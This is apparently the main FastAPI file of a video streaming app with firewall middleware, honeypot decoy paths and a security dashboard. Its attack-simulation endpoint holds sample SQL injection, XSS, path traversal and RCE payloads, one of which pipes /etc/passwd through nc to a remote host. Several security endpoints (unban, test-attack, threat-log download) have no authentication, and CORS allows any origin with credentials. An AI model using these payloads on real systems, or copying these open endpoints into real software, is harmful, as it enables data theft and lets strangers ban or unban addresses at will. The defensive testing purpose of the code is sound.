"""
StreamGuard Full-Stack Video Streaming Application
Powered by FastAPI with Autonomous Multi-Layer Security Defense,
Intruder Geolocation Intelligence, Honeypot Canaries, and Daily Usage Audit Reports.
"""

import time
import os
from pathlib import Path
from datetime import datetime, date
from typing import Optional

from fastapi import FastAPI, Request, Response, HTTPException, status
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from app.logger import (
    log_access_hit,
    metrics,
    generate_daily_report,
    ACCESS_HITS_LOG,
    THREAT_LOCATIONS_LOG,
    HONEYPOT_TRAPS_LOG
)
from app.security import (
    evaluate_request_security,
    trigger_security_reaction,
    ip_manager,
    rate_limiter
)
from app.honeypots import honeypot_router
from app.live_tv import live_router
from app.amlve import amlve_router, audio_router
from app.global_cinema import global_router, get_cached_global_video, get_global_video_details
from app.data import (
    get_all_videos,
    get_video_by_id,
    toggle_like_video,
    add_video_comment,
    get_hero_featured,
    get_content_rails
)

STATIC_DIR = Path(__file__).resolve().parent.parent / "static"
LOGS_DIR = Path(__file__).resolve().parent.parent / "logs"

app = FastAPI(
    title="StreamGuard Streaming Platform",
    description="High-performance video streaming web platform with autonomous multi-layer security defense.",
    version="2.0.0"
)

# -----------------------------------------------------------------------------
# CORS Middleware
# -----------------------------------------------------------------------------
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# -----------------------------------------------------------------------------
# Middleware 1: Access Hit Logger & Execution Latency Tracker
# -----------------------------------------------------------------------------
@app.middleware("http")
async def hit_logger_middleware(request: Request, call_next):
    start_time = time.perf_counter()
    client_ip = request.client.host if request.client else "127.0.0.1"

    # Forward request down the pipeline
    response = await call_next(request)

    latency_ms = (time.perf_counter() - start_time) * 1000.0

    # Log access hit to access_hits.log
    log_access_hit(
        ip=client_ip,
        method=request.method,
        path=str(request.url.path),
        status_code=response.status_code,
        latency_ms=latency_ms,
        user_agent=request.headers.get("user-agent", "-"),
        referer=request.headers.get("referer", "-")
    )

    # Inherent Security Headers injection
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["X-Shield-Defense"] = "StreamGuard-Autonomous-AI-WAF-Active"
    response.headers["X-AdGuard-Protection"] = "Active"
    response.headers["X-AdGuard-DNS"] = "dns.adguard.com (94.140.14.14)"
    response.headers["X-AdGuard-Shield"] = "Popup-Free"

    return response

# -----------------------------------------------------------------------------
# Middleware 2: Multi-Layer Perimeter Security & Intrusion Shield
# -----------------------------------------------------------------------------
@app.middleware("http")
async def security_waf_middleware(request: Request, call_next):
    client_ip = request.client.host if request.client else "127.0.0.1"
    path = str(request.url.path)

    # Honeypot routes have their own entrapment logic - do not block before they take the bait!
    honeypot_paths = [
        "/.env", "/env", "/admin", "/wp-admin", "/administrator",
        "/backup.sql", "/dump.sql", "/database.sql", "/config.json",
        "/internal/config", "/api/v1/secret-keys", "/api/v1/honeypot/login-attempt"
    ]
    if path in honeypot_paths or path.startswith("/api/v1/honeypot/"):
        return await call_next(request)

    # Allow simulation endpoint to execute even if client is banned, for testing purposes
    if path.startswith("/api/security/test-attack") or path.startswith("/api/security/unban"):
        return await call_next(request)

    # In-App Streaming Gateway (Self-Proxy Relay) routes media segments directly
    if path.startswith("/api/live/gateway"):
        return await call_next(request)

    query_str = str(request.url.query)
    headers_dict = dict(request.headers)

    # Check request body for threats on mutating requests (POST/PUT/PATCH)
    body_text = ""
    if request.method in ("POST", "PUT", "PATCH") and not path.startswith("/static"):
        try:
            body_bytes = await request.body()
            body_text = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            body_text = ""

    # Evaluate security across all layers
    is_threat, threat_type, payload = await evaluate_request_security(
        ip=client_ip,
        method=request.method,
        path=path,
        query_string=query_str,
        headers=headers_dict,
        body_text=body_text
    )

    if is_threat:
        # Trigger autonomous defense reaction, geolocate the attacker, and write to threat_locations.log
        defense_result = await trigger_security_reaction(
            ip=client_ip,
            threat_type=threat_type or "UNIDENTIFIED_EXPLOIT_PROBE",
            path=path,
            payload=payload or path
        )

        return JSONResponse(
            status_code=status.HTTP_403_FORBIDDEN,
            content={
                "error": "Access Denied by StreamGuard Autonomous Defense Grid",
                "code": "SECURITY_THREAT_BLOCKED",
                "threat_classification": threat_type,
                "attacker_ip": client_ip,
                "recorded_location": defense_result.get("location"),
                "incident_timestamp": defense_result.get("timestamp"),
                "log_notice": "Hostile activity has been logged in threat_locations.log and IP quarantined."
            }
        )

    return await call_next(request)

# -----------------------------------------------------------------------------
# Include Honeypot Decoys, Live TV Gateway & AMLVE Routers
# -----------------------------------------------------------------------------
app.include_router(honeypot_router)
app.include_router(live_router)
app.include_router(amlve_router)
app.include_router(audio_router)
app.include_router(global_router)

# -----------------------------------------------------------------------------
# Video Streaming Application APIs
# -----------------------------------------------------------------------------

class CommentRequest(BaseModel):
    author: str
    text: str

@app.get("/api/videos")
async def list_videos(category: Optional[str] = None, search: Optional[str] = None, content_type: Optional[str] = None):
    """Retrieve all video media catalog with optional category, content_type, and search filters."""
    videos = get_all_videos(category=category, search=search, content_type=content_type)
    return {"videos": videos, "total": len(videos)}

@app.get("/api/videos/featured")
async def get_featured_hero():
    """Returns top featured title for the Hero Billboard banner."""
    return {"featured": get_hero_featured()}

@app.get("/api/videos/rails")
async def get_rails():
    """Returns categorized horizontal rails (Trending, Movies, Series, Anime)."""
    return {"rails": get_content_rails()}

@app.get("/api/videos/{video_id}")
async def get_video(video_id: str):
    """Get single video details and increment stream view counter."""
    video = get_video_by_id(video_id)
    if not video:
        video = get_cached_global_video(video_id)
        if not video:
            try:
                g_res = await get_global_video_details(video_id)
                video = g_res.get("video")
            except Exception:
                video = None

    if not video:
        raise HTTPException(status_code=404, detail="Video not found")
    
    # Also fetch up next / recommended suggestions
    recommended = [v for v in get_all_videos() if v["id"] != video_id]
    return {
        "video": video,
        "recommended": recommended
    }

@app.post("/api/videos/{video_id}/like")
async def like_video(video_id: str):
    """Like a video stream."""
    likes = toggle_like_video(video_id)
    if likes is None:
        raise HTTPException(status_code=404, detail="Video not found")
    return {"status": "success", "likes": likes}

@app.post("/api/videos/{video_id}/comment")
async def post_comment(video_id: str, payload: CommentRequest):
    """Add user comment with threat sanitization."""
    # Extra check for sanitized input
    comment = add_video_comment(video_id, payload.author, payload.text)
    if not comment:
        raise HTTPException(status_code=404, detail="Video not found")
    return {"status": "success", "comment": comment}

@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    """Return 204 No Content for favicon requests to prevent 404 logs."""
    return Response(content=b"", status_code=204)

# -----------------------------------------------------------------------------
# Security & Audit Dashboard APIs
# -----------------------------------------------------------------------------

@app.get("/api/security/stats")
async def get_security_stats():
    """Real-time security telemetry and threat statistics."""
    banned_list = ip_manager.get_all_banned()
    return {
        "defense_status": "ONLINE & ENFORCING",
        "shield_layers": [
            "L1: Perimeter WAF (SQLi, XSS, Traversal, RCE, SSTI)",
            "L2: Adaptive Rate Limiter & Anti-Flood Engine",
            "L3: Intruder Geolocation Telemetry (threat_locations.log)",
            "L4: Honeypot Deception Chamber (.env, /admin, backup.sql)",
            "L5: Daily Usage & Threat Intelligence Reporting"
        ],
        "metrics": {
            "total_hits": metrics.daily_hits,
            "unique_visitors": len(metrics.unique_ips),
            "video_plays": metrics.video_plays,
            "attacks_blocked": metrics.attacks_blocked,
            "honeypots_triggered": metrics.honeypot_triggers,
            "attack_breakdown": metrics.attack_types
        },
        "active_quarantined_ips": len(banned_list),
        "recent_threats": metrics.recent_threats[:15],
        "recent_hits": metrics.recent_hits[:15],
        "log_files": {
            "access_hits_log": str(ACCESS_HITS_LOG),
            "threat_locations_log": str(THREAT_LOCATIONS_LOG),
            "honeypot_traps_log": str(HONEYPOT_TRAPS_LOG)
        }
    }

@app.get("/api/security/daily-report")
async def get_daily_report_api():
    """Generates and returns the latest daily usage and security report."""
    report = generate_daily_report()
    return report

@app.get("/api/security/download-report")
async def download_daily_report():
    """Downloads the raw text daily report file."""
    date_str = date.today().strftime("%Y-%m-%d")
    report_file = LOGS_DIR / f"daily_report_{date_str}.log"
    if not report_file.exists():
        generate_daily_report()
    return FileResponse(
        path=report_file,
        filename=f"daily_report_{date_str}.log",
        media_type="text/plain"
    )

@app.get("/api/security/threat-locations-file")
async def download_threat_locations_file():
    """Returns or reads the threat_locations.log content directly."""
    if not THREAT_LOCATIONS_LOG.exists():
        THREAT_LOCATIONS_LOG.touch()
    content = THREAT_LOCATIONS_LOG.read_text(encoding="utf-8", errors="ignore")
    return PlainTextResponse(content, media_type="text/plain")

class TestAttackPayload(BaseModel):
    attack_type: str  # "sqli", "xss", "traversal", "rce", "honeypot", "scanner"
    custom_payload: Optional[str] = None
    simulated_ip: Optional[str] = None

@app.post("/api/security/test-attack")
async def simulate_attack(payload: TestAttackPayload, request: Request):
    """
    Simulation tool to test security defense and verify that
    threats are blocked, geolocated, and written to threat_locations.log.
    """
    client_ip = payload.simulated_ip or (request.client.host if request.client else "127.0.0.1")
    attack_type = payload.attack_type.lower()

    payload_samples = {
        "sqli": "admin' UNION SELECT null, username, password_hash FROM admin_credentials--",
        "xss": "<script>alert('XSS Exploit Vulnerability Triggered');</script>",
        "traversal": "../../../../etc/passwd",
        "rce": "; cat /etc/passwd | nc 10.0.0.1 4444",
        "scanner": "Mozilla/5.0 (compatible; sqlmap/1.7.2#stable; http://sqlmap.org)",
        "honeypot": "Attempted canary access to /.env"
    }

    test_payload = payload.custom_payload or payload_samples.get(attack_type, "UNION SELECT 1,2,3")

    defense_result = await trigger_security_reaction(
        ip=client_ip,
        threat_type=f"SIMULATED_{attack_type.upper()}_ATTACK",
        path=f"/api/test/{attack_type}",
        payload=test_payload
    )

    return {
        "success": True,
        "message": "Attack simulation intercepted and neutralized by Multi-Layer Security Grid.",
        "defense_result": defense_result,
        "threat_logged_to": str(THREAT_LOCATIONS_LOG)
    }

@app.post("/api/security/unban")
async def unban_client_ip(request: Request, ip: Optional[str] = None):
    """Unbans an IP (for testing recovery)."""
    target_ip = ip or (request.client.host if request.client else "127.0.0.1")
    ip_manager.unban_ip(target_ip)
    return {"status": "unbanned", "ip": target_ip}

# -----------------------------------------------------------------------------
# Frontend View Routes
# -----------------------------------------------------------------------------

@app.get("/", response_class=HTMLResponse)
async def serve_home():
    """Serves main video streaming web application with anti-caching headers."""
    index_file = STATIC_DIR / "index.html"
    if index_file.exists():
        resp = HTMLResponse(index_file.read_text(encoding="utf-8"))
        resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        resp.headers["Pragma"] = "no-cache"
        resp.headers["Expires"] = "0"
        return resp
    return HTMLResponse("<h1>StreamGuard Loading...</h1>")

@app.get("/api/security/adguard-status")
async def get_adguard_dns_status():
    """Returns active AdGuard DNS (dns.adguard.com) protection status."""
    return {
        "dns_provider": "AdGuard DNS (dns.adguard.com)",
        "doh_server": "https://dns.adguard-dns.com/dns-query",
        "primary_ip": "94.140.14.14",
        "secondary_ip": "94.140.15.15",
        "status": "PROTECTED",
        "features": ["Popups Blocked", "Auto-Downloads Blocked", "Tracker Interception Active"],
        "timestamp": time.time()
    }

@app.get("/security-dashboard", response_class=HTMLResponse)
async def serve_admin_dashboard():
    """Serves the live Security & Usage Audit Dashboard."""
    admin_file = STATIC_DIR / "admin.html"
    if admin_file.exists():
        return HTMLResponse(admin_file.read_text(encoding="utf-8"))
    return HTMLResponse("<h1>Security Dashboard Loading...</h1>")

# Mount Static Files (CSS, JS, assets)
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# Startup Event: generate initial daily report structure
@app.on_event("startup")
async def on_startup():
    generate_daily_report()
    print("==================================================================")
    print(" [StreamGuard] Video Streaming Web Platform Online")
    print(" [StreamGuard] Multi-Layer Defense Grid: ACTIVE")
    print(" [StreamGuard] Access Hits Log: logs/access_hits.log")
    print(" [StreamGuard] Attacker Location Log: logs/threat_locations.log")
    print(" [StreamGuard] Honeypot Canary Decoys: ACTIVE (/.env, /admin, etc.)")
    print("==================================================================")
